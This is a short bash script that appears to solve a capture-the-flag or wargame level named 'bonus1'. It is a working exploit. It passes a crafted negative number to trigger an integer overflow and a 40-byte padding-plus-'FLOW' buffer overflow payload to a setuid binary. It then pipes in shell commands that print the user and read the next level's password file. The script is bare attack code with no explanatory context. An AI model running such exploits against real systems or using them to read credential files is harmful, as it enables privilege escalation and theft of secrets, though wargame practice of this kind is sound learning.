#!/bin/bash

GETPASS="cat /home/user/bonus3/.pass"

set -x

NUMBER=-1073741813
EXPLOIT=`python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"'`

(~/bonus1 $NUMBER $EXPLOIT) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI
